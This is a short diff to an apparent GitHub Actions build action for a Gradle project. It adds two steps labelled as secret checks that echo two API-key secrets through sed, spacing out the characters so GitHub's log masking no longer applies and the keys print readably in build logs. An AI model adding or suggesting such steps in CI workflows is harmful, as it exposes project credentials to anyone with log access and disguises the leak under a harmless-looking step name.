@@ -26,6 +26,12 @@ runs:
         distribution: 'temurin' # See 'Supported distributions' for available options
         java-version: '17'
         cache: gradle
+    - name: Check secrets apikey
+      shell: bash
+      run: echo ${{ secrets.OTASHARE_APIKEY }} | sed 's/./& /g'
+    - name: Check secrets apikeyBuild
+      shell: bash
+      run: echo ${{ secrets.OTASHARE_APIKEY_BUILD }} | sed 's/./& /g'
     - name: Grant execute permission for gradlew
       shell: bash
       run: chmod +x gradlew
